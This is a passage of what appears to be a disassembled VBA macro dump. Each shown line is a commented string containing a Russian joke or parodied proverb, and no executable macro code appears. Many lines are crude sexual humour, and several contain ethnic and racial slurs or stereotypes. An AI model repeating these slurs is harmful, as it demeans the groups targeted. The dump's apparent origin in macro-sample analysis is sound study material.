' 	QuoteRem 0x0000 0x005A "Вино, девочки, ночная Москва, милиция, драки, разбитые автомобили, разорённые гнёзда любви"
' Line #91:
' 	QuoteRem 0x0000 0x002C "Водка "Буратино" - почувствуйте себя дровами"
' Line #92:
' 	QuoteRem 0x0000 0x0014 "Возьми коня за рога!"
' Line #93:
' 	QuoteRem 0x0000 0x0023 "Волков бояться - в лесу не ебаться!"
' Line #94:
' 	QuoteRem 0x0000 0x0021 "Время лечит, но доктор - быстрее."
' Line #95:
' 	QuoteRem 0x0000 0x0019 "все гениальное - простынь"
' Line #96:
' 	QuoteRem 0x0000 0x0017 "Все генитальное просто."
' Line #97:
' 	QuoteRem 0x0000 0x0013 "Все лишнее - детям!"
' Line #98:
' 	QuoteRem 0x0000 0x0031 "Всё не так плохо как вы думаете, все намного хуже"
' Line #99:
' 	QuoteRem 0x0000 0x001F "Все хорошо, что хорошо качается"
' Line #100:
' 	QuoteRem 0x0000 0x0036 "Выйти в город: у людей посмотреть, да свой показать..."
' Line #101:
' 	QuoteRem 0x0000 0x0018 "Где совок - там и мусор."
' Line #102:
' 	QuoteRem 0x0000 0x0024 "Гениталии всех стран - соединяйтесь!"
' Line #103:
' 	QuoteRem 0x0000 0x0034 "Глyпый пингвин pобко пpячет, хитpый - нагло достает."
' Line #104:
' 	QuoteRem 0x0000 0x0022 "Главное, ребята, перцем не стареть"
' Line #105:
' 	QuoteRem 0x0000 0x005A "Говорят, что смех продлевает жизнь того, кто смеется, очевидно за счет жизни того, над кем"
' Line #106:
' 	QuoteRem 0x0000 0x0021 "Голод не тетка - в лес не убежит."
' Line #107:
' 	QuoteRem 0x0000 0x0022 "Голод не тетка - полюбишь и козла."
' Line #108:
' 	QuoteRem 0x0000 0x001B "Голубая мечта - найти друга"
' Line #109:
' 	QuoteRem 0x0000 0x0033 "Гостей встpечают по одежке, а пpовожают - по моpде!"
' Line #110:
' 	QuoteRem 0x0000 0x0023 "Готовь сани летом, а честь смолоду."
' Line #111:
' 	QuoteRem 0x0000 0x001A "Гроша выеденного не стоит."
' Line #112:
' 	QuoteRem 0x0000 0x002A "Даже если вас съели, у вас есть два выхода"
' Line #113:
' 	QuoteRem 0x0000 0x0043 "Даже хорошей танцовщице порой мешает то, что мешает плохому танцору"
' Line #114:
' 	QuoteRem 0x0000 0x003C "Дай дураку хуй стеклянный, он и хуй разобьет и руки порежет."
' Line #115:
' 	QuoteRem 0x0000 0x0029 "Дайте солдату точку опоры, и он... уснет."
' Line #116:
' 	QuoteRem 0x0000 0x002B "Дальше - больше...быстрее, выше, сильнее..."
' Line #117:
' 	QuoteRem 0x0000 0x0027 "Дареному провайдеру в канал не смотрят."
' Line #118:
' 	QuoteRem 0x0000 0x0019 "Даром - за амбаром, понял"
' Line #119:
' 	QuoteRem 0x0000 0x001A "Де юро, де факто, де било."
' Line #120:
' 	QuoteRem 0x0000 0x001C "Делу вpемя, потехе - деньги."
' Line #121:
' 	QuoteRem 0x0000 0x002E "Держи себя в руках!, если тебя не держат ноги."
' Line #122:
' 	QuoteRem 0x0000 0x002A "Дети - цветы жизни. Дарите женщинам цветы!"
' Line #123:
' 	QuoteRem 0x0000 0x0032 "Длинные ноги - не роскошь, а средство передвижения"
' Line #124:
' 	QuoteRem 0x0000 0x0020 "Днем с огнем, вечером - разогнем"
' Line #125:
' 	QuoteRem 0x0000 0x0018 "До самых костей мозга..."
' Line #126:
' 	QuoteRem 0x0000 0x0013 "Долг нагишом платят"
' Line #127:
' 	QuoteRem 0x0000 0x0016 "Долг платежом страшен."
' Line #128:
' 	QuoteRem 0x0000 0x0016 "Долг процентом красен."
' Line #129:
' 	QuoteRem 0x0000 0x001D "Дома негра и стены ненавидят."
' Line #130:
' 	QuoteRem 0x0000 0x0020 "Дома от воpа и стены не помогут."
' Line #131:
' 	QuoteRem 0x0000 0x0016 "Друг познается в бидэ."
' Line #132:
' 	QuoteRem 0x0000 0x002C "Друга нельзя купить, зато его можно продать."
' Line #133:
' 	QuoteRem 0x0000 0x0027 "Дружба дружбой, но куда же деть либидо?"
' Line #134:
' 	QuoteRem 0x0000 0x0016 "Друзья познаются в еде"
' Line #135:
' 	QuoteRem 0x0000 0x002C "Ёж птица гордая. Пока не пнешь - не полетит!"
' Line #136:
' 	QuoteRem 0x0000 0x0032 "Если Вы проснулись на улице, значит Вы там заснули"
' Line #137:
' 	QuoteRem 0x0000 0x0022 "Если голова болит, значит она есть"
' Line #138:
' 	QuoteRem 0x0000 0x0028 "Если нельзя, но очень хочется, то можно!"
' Line #139:
' 	QuoteRem 0x0000 0x0017 "Если хочешь петь - пей!"
' Line #140:
' 	QuoteRem 0x0000 0x0033 "Если хочешь поработать - ляг, поспи, и все пройдет!"
' Line #141:
' 	QuoteRem 0x0000 0x0048 "Есть еще порох в пороховницах и ягоды в ягодицах! (и влага во влагалище)"
' Line #142:
' 	QuoteRem 0x0000 0x0019 "Есть ещё шары в шароварах"
' Line #143:
' 	QuoteRem 0x0000 0x0020 "Жареному коню в жопу не смотрят."
' Line #144:
' 	QuoteRem 0x0000 0x0031 "Желаем Вам счастья, здоровья и творческих узбеков"
' Line #145:
' 	QuoteRem 0x0000 0x0021 "Желаю Вам здоровья в личной жизни"
' Line #146:
' 	QuoteRem 0x0000 0x0037 "Женщины любят мужчину в себе, а мужчины себя в женщине!"
' Line #147:
' 	QuoteRem 0x0000 0x0033 "Женщины способны на все, мужчины - на все остальное"
' Line #148:
' 	QuoteRem 0x0000 0x0029 "Жизнь - вредная штука - от нее умирают..."
' Line #149:
' 	QuoteRem 0x0000 0x0035 "Жизнь невозможно повернуть назад, да и зачем она там?"
' Line #150:
' 	QuoteRem 0x0000 0x0027 "Жизнь прожить - не два пальца обоссать!"
' Line #151:
' 	QuoteRem 0x0000 0x0021 "Жила-была девочка, сама виновата."
' Line #152:
' 	QuoteRem 0x0000 0x0034 "За двумя зайцами погонишся - дуракам закон не писан."
' Line #153:
' 	QuoteRem 0x0000 0x0031 "За двумя зайцами погонишся - на тапор напорешься."
' Line #154:
' 	QuoteRem 0x0000 0x0032 "За двумя зайцами погонишся - никуда не дозвонишся."
' Line #155:
' 	QuoteRem 0x0000 0x0039 "За двумя зайцами погонишься - от обоих по моpде получишь."
' Line #156:
' 	QuoteRem 0x0000 0x0033 "За двумя зайцами погонишься - третьего не поймаешь!"
' Line #157:
' 	QuoteRem 0x0000 0x001F "За одного битого 15 суток дают."
' Line #158:
' 	QuoteRem 0x0000 0x0027 "Замысел без умысла называется вымыслом."
' Line #159:
' 	QuoteRem 0x0000 0x0024 "Заряженному танку в дуло не смотрят."
' Line #160:
' 	QuoteRem 0x0000 0x0030 "Здесь будет город заложен - надпись на ломбарде."
' Line #161:
' 	QuoteRem 0x0000 0x0044 "Здравствуйте, мужчины и женщины, а так же те, у кого ещё все впереди"
' Line #162:
' 	QuoteRem 0x0000 0x0031 "Земли - крестьянам, заводы - рабочим, пиво - МНЕ."
' Line #163:
' 	QuoteRem 0x0000 0x001F "Зубов боятся - в рот не давать."
' Line #164:
' 	QuoteRem 0x0000 0x001B "И баба с возу, и волки сыты"
' Line #165:
' 	QuoteRem 0x0000 0x001B "И волки сыты, и овцы целки."
' Line #166:
' 	QuoteRem 0x0000 0x001D "И женщина, как буря, улеглась"
' Line #167:
' 	QuoteRem 0x0000 0x0026 "И на елку залезть, и жопу не ободрать."
' Line #168:
' 	QuoteRem 0x0000 0x0012 "И ухом не моргнул!"
' Line #169:
' 	QuoteRem 0x0000 0x0032 "Изготовим портрет вашего врага на туалетной бумаге"
' Line #170:
' 	QuoteRem 0x0000 0x001D "Иных уж нет, других - долечим"
' Line #171:
' 	QuoteRem 0x0000 0x0042 "Искусство требует жертв, и с каждым днем их становится все больше."
' Line #172:
' 	QuoteRem 0x0000 0x0010 "Ищи негра ночью!"
' Line #173:
' 	QuoteRem 0x0000 0x0024 "Каждая пипетка мечтает стать клизмой"
' Line #174:
' 	QuoteRem 0x0000 0x003E "Каждой твари - по паре. (так говорил некий препод на экзамене)"
' Line #175:
' 	QuoteRem 0x0000 0x0017 "Каждой твари - по харе!"
' Line #176:
' 	QuoteRem 0x0000 0x0021 "Каждый мужчина имеет право налево"
' Line #177:
' 	QuoteRem 0x0000 0x003A "Каждый народ имеет такое правительство, которое имеет его."
' Line #178:
' 	QuoteRem 0x0000 0x001A "Как два байта переслать..."
' Line #179:
' 	QuoteRem 0x0000 0x002D "Как много девушек хороших, а я люблю женатого"
' Line #180:
' 	QuoteRem 0x0000 0x0034 "Как много девушек хороших, но тянет что-то на плохих"
' Line #181:
' 	QuoteRem 0x0000 0x001F "Как упоительна в России ветчина"
' Line #182:
' 	QuoteRem 0x0000 0x0019 "Каков стол, таков и стул."
' Line #183:
' 	QuoteRem 0x0000 0x0026 "Какой быстрый ездок не любит "Русской""
' Line #184:
' 	QuoteRem 0x0000 0x003A "Капля никотина убивает лошадь, а хомяка разрывает на куски"
' Line #185:
' 	QuoteRem 0x0000 0x0021 "Кишка тонка, и танки наши быстры!"
' Line #186:
' 	QuoteRem 0x0000 0x0017 "Клизма, Знай свое место"
' Line #187:
' 	QuoteRem 0x0000 0x0022 "Кому тошно, а кому и в попу можно."
' Line #188:
' 	QuoteRem 0x0000 0x0012 "Конец - телу венец"
' Line #189:
' 	QuoteRem 0x0000 0x001A "Кончил мимо - гуляй смело."
' Line #190:
' 	QuoteRem 0x0000 0x001A "Кончил смело - гуляй мимо."
' Line #191:
' 	QuoteRem 0x0000 0x0033 "Красна изба не кутежами, а своевременными платежами"
' Line #192:
' 	QuoteRem 0x0000 0x0020 "Крепче за шоферку держись, баран"
' Line #193:
' 	QuoteRem 0x0000 0x0019 "Крыша есть - ума не надо."
' Line #194:
' 	QuoteRem 0x0000 0x0021 "Кто pано встает, тот pано помpет."
' Line #195:
' 	QuoteRem 0x0000 0x0030 "Кто к нам с мечом придёт, тот в орало и получит."
' Line #196:
' 	QuoteRem 0x0000 0x0033 "Кто к нам с рублем пришел - тот от рубля и погибнет"
' Line #197:
' 	QuoteRem 0x0000 0x0048 "Кто курит - кончает раком, а кто бросает курить - оттягивает свой конец."
' Line #198:
' 	QuoteRem 0x0000 0x0023 "Кто на рояли играет, тот ее и носит"
' Line #199:
' 	QuoteRem 0x0000 0x001A "Кто не работает, тот пьет!"
' Line #200:
' 	QuoteRem 0x0000 0x001C "Кто последний, тот и вводит."
' Line #201:
' 	QuoteRem 0x0000 0x001A "Кто последний, тот и папа!"
' Line #202:
' 	QuoteRem 0x0000 0x001E "Кто раньше встал, того и тапки"
' Line #203:
' 	QuoteRem 0x0000 0x0020 "Куда ни кинь, сам туда попадешь."
' Line #204:
' 	QuoteRem 0x0000 0x001E "Куй железо не отходя от кассы!"
' Line #205:
' 	QuoteRem 0x0000 0x0021 "Лежит боец, не справился с атакой"
' Line #206:
' 	QuoteRem 0x0000 0x001E "Лети с приветом, вернись умным"
' Line #207:
' 	QuoteRem 0x0000 0x0023 "Ложись девка и большая и маленькая."
' Line #208:
' 	QuoteRem 0x0000 0x0021 "Лучше гор могут быть только горцы"
' Line #209:
' 	QuoteRem 0x0000 0x0032 "Лучше иметь синицу в руках, чем утку под кроватью."
' Line #210:
' 	QuoteRem 0x0000 0x0026 "Лучше иметь синицу, когда она в руках!"
' Line #211:
' 	QuoteRem 0x0000 0x0036 "Лучше колымить на Гондурасе, чем гондурасить на Колыме"
' Line #212:
' 	QuoteRem 0x0000 0x001D "Лучше переспать, чем недоесть"
' Line #213:
' 	QuoteRem 0x0000 0x002B "Лучше синица в руках, чем утка под кроватью"
' Line #214:
' 	QuoteRem 0x0000 0x0028 "Лучше ужасный конец, чем ужас без конца."
' Line #215:
' 	QuoteRem 0x0000 0x0036 "Лучший способ покончить в себя - наложить себе в руки."
' Line #216:
' 	QuoteRem 0x0000 0x0017 "Лысый пешему не конный."
' Line #217:
' 	QuoteRem 0x0000 0x001B "Любви все плоскости покорны"
' Line #218:
' 	QuoteRem 0x0000 0x002E "Любимая, таких, как ты, не было, нет и не надо"
' Line #219:
' 	QuoteRem 0x0000 0x0019 "Любите Родину, мать вашу!"
' Line #220:
' 	QuoteRem 0x0000 0x002B "Любишь кататься - катись к чеpтовой матеpи!"
' Line #221:
' 	QuoteRem 0x0000 0x0021 "Любишь кататься - люби и катайся!"
' Line #222:
' 	QuoteRem 0x0000 0x002B "Любишь кататься - люби и с санками ебаться."
' Line #223:
' 	QuoteRem 0x0000 0x0021 "Любишь кататься, имей сто рублей."
' Line #224:
' 	QuoteRem 0x0000 0x0027 "Любишь кататься, люби и самочек возить!"
' Line #225:
' 	QuoteRem 0x0000 0x001F "Мал золотник, да и взять негде."
' Line #226:
' 	QuoteRem 0x0000 0x0027 "Маленькая рыбка лучше большого таракана"
' Line #227:
' 	QuoteRem 0x0000 0x0018 "Мальчик кончил в тампон."
' Line #228:
' 	QuoteRem 0x0000 0x0023 "Маникюр -медикам, педикюр - педикам"
' Line #229:
' 	QuoteRem 0x0000 0x001A "Машу пальцем не испортишь."
' Line #230:
' 	QuoteRem 0x0000 0x0021 "Меня голыми ногами не возьмешь!!!"
' Line #231:
' 	QuoteRem 0x0000 0x0024 "Меняю проигрыватель на выигрыватель."
' Line #232:
' 	QuoteRem 0x0000 0x001B "Местами стать бы Гулливером"
' Line #233:
' 	QuoteRem 0x0000 0x0015 "Мир DOOM 'у твоему..."
' Line #234:
' 	QuoteRem 0x0000 0x002B "Митя идет на митинг а Петя идет на петтинг."
' Line #235:
' 	QuoteRem 0x0000 0x001A "Могила горбатого - справа."
' Line #236:
' 	QuoteRem 0x0000 0x001D "Мой дядя самых честных грабил"
' Line #237:
' 	QuoteRem 0x0000 0x001E "Мой дядя самых честных грабил."
' Line #238:
' 	QuoteRem 0x0000 0x0016 "Мойте руки вместо еды."
' Line #239:
' 	QuoteRem 0x0000 0x0017 "Мойте руки, перед и зад"
' Line #240:
' 	QuoteRem 0x0000 0x0042 "Мужчина - это такая тварь, хуже которой может быть только женщина."
' Line #241:
' 	QuoteRem 0x0000 0x0035 "Мужчина гоняется за женщиной, пока она его не поймает"
' Line #242:
' 	QuoteRem 0x0000 0x0026 "мужчины -Женитесь, Женщины - Мужайтесь"
' Line #243:
' 	QuoteRem 0x0000 0x002D "Мы придем к Вам на выручку, если есть выручка"
' Line #244:
' 	QuoteRem 0x0000 0x0013 "На ошибках мучаются"
' Line #245:
' 	QuoteRem 0x0000 0x0024 "На птичьих правах далеко не взлетишь"
' Line #246:
' 	QuoteRem 0x0000 0x0037 "Надпись над писсуаром: "Не льсти себе, подойди поближе""
' Line #247:
' 	QuoteRem 0x0000 0x001C "Нам химия блондинок подарила"
' Line #248:
' 	QuoteRem 0x0000 0x002B "Наши поезда - самые поездатые поезда в мире"
' Line #249:
' 	QuoteRem 0x0000 0x0013 "Не болтайте ерундой"
' Line #250:
' 	QuoteRem 0x0000 0x0016 "Не бросай друга в биде"
' Line #251:
' 	QuoteRem 0x0000 0x0021 "Не все то золото, что плохо лежит"
' Line #252:
' 	QuoteRem 0x0000 0x001E "Не все то солнышко, что встает"
' Line #253:
' 	QuoteRem 0x0000 0x0032 "Не могу стоять когда другие работают, пойду полежу"
' Line #254:
' 	QuoteRem 0x0000 0x0025 "Не могу стоять на своем, очень больно"
' Line #255:
' 	QuoteRem 0x0000 0x0014 "не отвлекаются, любя"
' Line #256:
' 	QuoteRem 0x0000 0x0030 "Не перепились еще на Руси богатыри-добры молодцы"
' Line #257:
' 	QuoteRem 0x0000 0x0014 "Не по Хуану сомбреро"
' Line #258:
' 	QuoteRem 0x0000 0x0014 "Не порно, да задорно"
' Line #259:
' 	QuoteRem 0x0000 0x0022 "Не рой другому яму, пусть сам роет"
' Line #260:
' 	QuoteRem 0x0000 0x001E "Не руби сук, на которых сидишь"
' Line #261:
' 	QuoteRem 0x0000 0x001A "Не свисти - девок не будет"
' Line #262:
' 	QuoteRem 0x0000 0x0012 "Не стой под струей"
' Line #263:
' 	QuoteRem 0x0000 0x0020 "Не суй свой взнос не в свое дело"
' Line #264:
' 	QuoteRem 0x0000 0x0024 "Не так страшен черт, как его малютка"
' Line #265:
' 	QuoteRem 0x0000 0x0017 "Не умеешь петь - не пей"
' Line #266:
' 	QuoteRem 0x0000 0x0013 "Не учи отца и баста"
' Line #267:
' 	QuoteRem 0x0000 0x0028 "Невеста запатентовала предложение жениха"
' Line #268:
' 	QuoteRem 0x0000 0x0049 "Нету денег - привяжите сзади веник, бегите и метите, наметете - приносите"
' Line #269:
' 	QuoteRem 0x0000 0x0014 "Ниже пейджера не бей"
' Line #270:
' 	QuoteRem 0x0000 0x0031 "Ничто не красит так женщин, как перекись водорода"
' Line #271:
' 	QuoteRem 0x0000 0x0033 "Ну и запросы у вас - сказала база данных и повисла."
' Line #272:
' 	QuoteRem 0x0000 0x002D "Нырнул с аквалангом - не прикидывайся шлангом"
' Line #273:
' 	QuoteRem 0x0000 0x0029 "О чем у нас говорится, все в дело годится"
' Line #274:
' 	QuoteRem 0x0000 0x001C "Обиваю двери кожей заказчика"
' Line #275:
' 	QuoteRem 0x0000 0x001C "Обналичим Нобелевскую премию"
' Line #276:
' 	QuoteRem 0x0000 0x001C "Один в поле - хуже татарина."
' Line #277:
' 	QuoteRem 0x0000 0x0028 "Одна голова - хоpошо, а два сапога паpа."
' Line #278:
' 	QuoteRem 0x0000 0x0024 "Одна голова хорошо, а все тело лучше"
' Line #279:
' 	QuoteRem 0x0000 0x003C "Однажды в студеную зимнюю пору смотрю - поднимается медленно"
' Line #280:
' 	QuoteRem 0x0000 0x001C "Однажды лебедь раком щуку..."
' Line #281:
' 	QuoteRem 0x0000 0x0022 "Он сказал: "Поехали" и запил водой"
' Line #282:
' 	QuoteRem 0x0000 0x002B "Она была лишена девственности стрелой амура"
' Line #283:
' 	QuoteRem 0x0000 0x003B "Она конечно не Венера, но что-то венерическое в ней есть..."
' Line #284:
' 	QuoteRem 0x0000 0x001A "Она на него рукой плюнула."
' Line #285:
' 	QuoteRem 0x0000 0x0031 "Оральный секс с вытекающими оттуда последствиями."
' Line #286:
' 	QuoteRem 0x0000 0x0022 "Оставь одежду, всяк сюда входящий!"
' Line #287:
' 	QuoteRem 0x0000 0x0019 "Остановите Землю, я сойду"
' Line #288:
' 	QuoteRem 0x0000 0x001B "Отдам концы в хорошие руки."
' Line #289:
' 	QuoteRem 0x0000 0x0024 "Папуас папуасу друг, товарищ и корм."
' Line #290:
' 	QuoteRem 0x0000 0x0020 "Первый блин маслом не испортишь."
' Line #291:
' 	QuoteRem 0x0000 0x002A "Пиво с утра не только вредно, но и полезно"
' Line #292:
' 	QuoteRem 0x0000 0x0021 "Пионерка - всем ребятам примерка."
' Line #293:
' 	QuoteRem 0x0000 0x0024 "Плати не ломайся - потом наслаждайся"
' Line #294:
' 	QuoteRem 0x0000 0x001A "Плачет девочка в банкомате"
' Line #295:
' 	QuoteRem 0x0000 0x0036 "Плох тот солдат, который не мечтает спать с генералом'"
' Line #296:
' 	QuoteRem 0x0000 0x0022 "Плох тот солдат, который не хочет."
' Line #297:
' 	QuoteRem 0x0000 0x002B "Плох тот солдат, который упал и не отжался."
' Line #298:
' 	QuoteRem 0x0000 0x0022 "По ногам текло, а в рот не попало!"
' Line #299:
' 	QuoteRem 0x0000 0x0023 "Под лежачий камень мы всегда успеем"
' Line #300:
' 	QuoteRem 0x0000 0x001A "Поймал мыша - ешь не спеша"
' Line #301:
' 	QuoteRem 0x0000 0x002C "Пока семь раз отмеришь - другие уже отрежут!"
' Line #302:
' 	QuoteRem 0x0000 0x0017 "Пользуясь случаем, хочу"
' Line #303:
' 	QuoteRem 0x0000 0x0025 "Посредством маразма дойдем до оргазма"
' Line #304:
' 	QuoteRem 0x0000 0x0024 "Постоять за себя, полежать за других"
' Line #305:
' 	QuoteRem 0x0000 0x004A "Потерялся черный дипломат, нашедшего просят сдать его в посольство Нигерии"
' Line #306:
' 	QuoteRem 0x0000 0x0020 "Почем вы девушки красивых любите"
' Line #307:
' 	QuoteRem 0x0000 0x0022 "Почём Вы, девушки, красивых любите"
' Line #308:
' 	QuoteRem 0x0000 0x002F "Предлагаю руку и серце в обмен на грудь и бедра"
' Line #309:
' 	QuoteRem 0x0000 0x0016 "Пришел, увидел и ушел."
' Line #310:
' 	QuoteRem 0x0000 0x0018 "Пришел , увидел, побелил"
' Line #311:
' 	QuoteRem 0x0000 0x0033 "Продается мальчик на побегушках. Пробег 3000 верст."
' Line #312:
' 	QuoteRem 0x0000 0x001B "Протяну ноги в хорошие руки"
' Line #313:
' 	QuoteRem 0x0000 0x001C "Проходи , Ложись, здравствуй"
' Line #314:
' 	QuoteRem 0x0000 0x0034 "Работа - не волк, а пpоизведение силы на pасстояние."
' Line #315:
' 	QuoteRem 0x0000 0x0022 "Работа не хрен - 100 лет простоит."
' Line #316:
' 	QuoteRem 0x0000 0x0027 "Ребята, с Моникой Левински надо кончать"
' Line #317:
' 	QuoteRem 0x0000 0x0031 "Ровно в полночь начнут бить кремлевские курсанты."
' Line #318:
' 	QuoteRem 0x0000 0x0020 "Рожденный брать давать не может."
' Line #319:
' 	QuoteRem 0x0000 0x0021 "Рожденный ползать упасть не может"
' Line #320:
' 	QuoteRem 0x0000 0x0020 "Рыбак рыбака ненавидит наверняка"
' Line #321:
' 	QuoteRem 0x0000 0x0023 "С кем поведешся, с тем и наберешся."
' Line #322:
' 	QuoteRem 0x0000 0x002B "С кем поведешься - от того и забеременеешь."
' Line #323:
' 	QuoteRem 0x0000 0x0022 "С кем поведешься - так тебе и надо"
' Line #324:
' 	QuoteRem 0x0000 0x0011 "С корабля на баб."
' Line #325:
' 	QuoteRem 0x0000 0x0016 "С мылом рай и в шалаше"
' Line #326:
' 	QuoteRem 0x0000 0x001C "С наступающим Вас опьянением"
' Line #327:
' 	QuoteRem 0x0000 0x0023 "Свежо питание, да серется с трудом!"
' Line #328:
' 	QuoteRem 0x0000 0x001A "Своя Hаташка ближе к телу."
' Line #329:
' 	QuoteRem 0x0000 0x0027 "Своя смирительная рубашка ближе к телу."
' Line #330:
' 	QuoteRem 0x0000 0x001E "Свято место с бюстом не бывает"
' Line #331:
' 	QuoteRem 0x0000 0x0027 "Сделай доброе дело и оно тебя достанет!"
' Line #332:
' 	QuoteRem 0x0000 0x001A "Сделал дело - бабу с воза."
' Line #333:
' 	QuoteRem 0x0000 0x0018 "Сделал дело - вымой тело"
' Line #334:
' 	QuoteRem 0x0000 0x001B "Сделал дело - кобыле легче."
' Line #335:
' 	QuoteRem 0x0000 0x001C "Сделал дело - слезай с тела."
' Line #336:
' 	QuoteRem 0x0000 0x0023 "Секс без дивчины - признак дурачины"
' Line #337:
' 	QuoteRem 0x0000 0x0015 "Семеро одного козлят."
' Line #338:
' 	QuoteRem 0x0000 0x0014 "Семеро одного найдут"
' Line #339:
' 	QuoteRem 0x0000 0x0015 "Семеро одного найдут."
' Line #340:
' 	QuoteRem 0x0000 0x0015 "Семь пядей в лобке..."
' Line #341:
' 	QuoteRem 0x0000 0x0024 "Семь раз об дверь, один раз об рельс"
' Line #342:
' 	QuoteRem 0x0000 0x001F "Семь раз отпей, один раз отъешь"
' Line #343:
' 	QuoteRem 0x0000 0x001A "Скажи-ка тётя, ты не даром"
' Line #344:
' 	QuoteRem 0x0000 0x0027 "Скажите, вы в мультфильмах не снимались"
' Line #345:
' 	QuoteRem 0x0000 0x001F "Сказала "НЕТ" и головой кивнула"
' Line #346:
' 	QuoteRem 0x0000 0x0030 "Склероз вылечить нельзя, зато о нем можно забыть"
' Line #347:
' 	QuoteRem 0x0000 0x0033 "Сколько в колодец не плюй, а все pавно в лес тянет."
' Line #348:
' 	QuoteRem 0x0000 0x0030 "Сколько водки не бери, все равно два раза бегать"
' Line #349:
' 	QuoteRem 0x0000 0x002B "Сколько волка не корми, а он все равно ест!"
' Line #350:
' 	QuoteRem 0x0000 0x0034 "Сколько волка не корми, а он все равно лоб расшибет!"
' Line #351:
' 	QuoteRem 0x0000 0x002F "Сколько волка не корми, а он все равно смотрит!"
' Line #352:
' 	QuoteRem 0x0000 0x0033 "Сколько волка не корми, а у слона все равно больше!"
' Line #353:
' 	QuoteRem 0x0000 0x0019 "Сколько Лен - столько Зин"
' Line #354:
' 	QuoteRem 0x0000 0x0026 "Слово не воробей, на голову не насрёт!"
' Line #355:
' 	QuoteRem 0x0000 0x0025 "Слово не воробей, поймают - вылетишь."
' Line #356:
' 	QuoteRem 0x0000 0x000E "Снимаю, порчу."
' Line #357:
' 	QuoteRem 0x0000 0x000B "Сниму трусы"
' Line #358:
' 	QuoteRem 0x0000 0x001F "Со зрением плохо, денег не вижу"
' Line #359:
' 	QuoteRem 0x0000 0x002F "Советские курицы - самые стройные курицы в мире"
' Line #360:
' 	QuoteRem 0x0000 0x0037 "Советские микросхемы - самые большие микросхемы в мире!"
' Line #361:
' 	QuoteRem 0x0000 0x0018 "Солдат по осени считают."
' Line #362:
' 	QuoteRem 0x0000 0x0032 "Солнце встало выше ели - время срать, а мы не ели."
' Line #363:
' 	QuoteRem 0x0000 0x0017 "Спички детям не помеха."
' Line #364:
' 	QuoteRem 0x0000 0x0029 "Старость - не радость, маразм - не оргазм"
' Line #365:
' 	QuoteRem 0x0000 0x001A "Старый друг лучше 2 подруг"
' Line #366:
' 	QuoteRem 0x0000 0x0025 "Супружеский долг. Исполняется впервые"
' Line #367:
' 	QuoteRem 0x0000 0x001D "Счастливые трусов не надевают"
' Line #368:
' 	QuoteRem 0x0000 0x0022 "Счастье есть, оно не может не есть"
' Line #369:
' 	QuoteRem 0x0000 0x0016 "Сытый конному не пеший"
' Line #370:
' 	QuoteRem 0x0000 0x001A "Сытый пьяного не разумеет."
' Line #371:
' 	QuoteRem 0x0000 0x0014 "Там хорошо, где нас!"
' Line #372:
' 	QuoteRem 0x0000 0x0013 "Таможня берет добро"
' Line #373:
' 	QuoteRem 0x0000 0x0019 "Темнота - залог здоpовья."
' Line #374:
' 	QuoteRem 0x0000 0x001D "Тёти до 16 лет не допускаются"
' Line #375:
' 	QuoteRem 0x0000 0x002F "Типун вам на ваш великий и могучий русский язык"
' Line #376:
' 	QuoteRem 0x0000 0x002E "Тиха украинская ночь, но САЛО надо перепрятать"
' Line #377:
' 	QuoteRem 0x0000 0x001C "Тише будешь - дальше уедешь."
' Line #378:
' 	QuoteRem 0x0000 0x0039 "Тише едешь - дальше будешь (от того места - куда едешь) ."
' Line #379:
' 	QuoteRem 0x0000 0x0019 "Тише едешь - толще морда."
' Line #380:
' 	QuoteRem 0x0000 0x001B "Тише едешь - хрен приедешь!"
' Line #381:
' 	QuoteRem 0x0000 0x002E "То, что женщине по душе, мужчине не по карману"
' Line #382:
' 	QuoteRem 0x0000 0x001F "Тому виднее, у кого нос длиннее"
' Line #383:
' 	QuoteRem 0x0000 0x0019 "Тому стыдно, у кого видно"
' Line #384:
' 	QuoteRem 0x0000 0x001A "Тощая корова ещё не газель"
' Line #385:
' 	QuoteRem 0x0000 0x0021 "Трое в лодке, не стесняясь собаки"
' Line #386:
' 	QuoteRem 0x0000 0x0026 "Ты, малый, не дурак, и дурак не малый."
' Line #387:
' 	QuoteRem 0x0000 0x0020 "Тяжело в лечении - легко в гробу"
' Line #388:
' 	QuoteRem 0x0000 0x0015 "У бобра добра не ищут"
' Line #389:
' 	QuoteRem 0x0000 0x001D "Улыбайтесь, шеф любит идиотов"
' Line #390:
' 	QuoteRem 0x0000 0x0037 "Умом ты можешь не блистать, но сапогом блистать обязан!"
' Line #391:
' 	QuoteRem 0x0000 0x0016 "Унитазу в душу насрали"
' Line #392:
' 	QuoteRem 0x0000 0x0013 "Утро вечера дряннее"
' Line #393:
' 	QuoteRem 0x0000 0x0015 "Утро добрым не бывает"
' Line #394:
' 	QuoteRem 0x0000 0x0013 "Уходя, гасите всех."
' Line #395:
' 	QuoteRem 0x0000 0x0026 "Ученье - свет, а за свет надо платить."
' Line #396:
' 	QuoteRem 0x0000 0x0021 "Ученье - свет, а неученых - тьма!"
' Line #397:
' 	QuoteRem 0x0000 0x0030 "Ученье свет, а неученье - чуть свет на работу..."
' Line #398:
' 	QuoteRem 0x0000 0x0044 "Фарш невозможно провернуть назад и мясо из котлет не восстановишь..."
' Line #399:
' 	QuoteRem 0x0000 0x005B "Хирурги считают, что внутренний мир человека лучше всего раскрывается на операционном столе"
' Line #400:
' 	QuoteRem 0x0000 0x0022 "Хозяйство вести - не хламом трясти"
' Line #401:
' 	QuoteRem 0x0000 0x002B "Хорошо смеется тот, кто смеется как лошадь."
' Line #402:
' 	QuoteRem 0x0000 0x002B "Хорошо смеется тот, кто стреляет последним."
' Line #403:
' 	QuoteRem 0x0000 0x003B "Хорошо, когда собака - друг, но плохо, когда друг - собака."
' Line #404:
' 	QuoteRem 0x0000 0x0028 "Хочешь большого и чистого - помой слона!"
' Line #405:
' 	QuoteRem 0x0000 0x001B "Хуй - железо, пока горячий."
' Line #406:
' 	QuoteRem 0x0000 0x002C "Цель оправдывает противозачаточные срeдства."
' Line #407:
' 	QuoteRem 0x0000 0x0014 "Цивильный серюльник."
' Line #408:
' 	QuoteRem 0x0000 0x0018 "Цыплят по осени стреляют"
' Line #409:
' 	QuoteRem 0x0000 0x001C "Чего пить, того не миновать."
' Line #410:
' 	QuoteRem 0x0000 0x0022 "Чего-то хочется, а кого не знаю..."
' Line #411:
' 	QuoteRem 0x0000 0x0036 "Чем больше женщину мы меньше, тем меньше больше мы ее!"
' Line #412:
' 	QuoteRem 0x0000 0x001D "Чем больше нас, тем меньше их"
' Line #413:
' 	QuoteRem 0x0000 0x0031 "Чем бы дитя не тешилось, лишь бы не забеременело."
' Line #414:
' 	QuoteRem 0x0000 0x002A "Чем бы дитя не тешилось, лишь бы не руками"
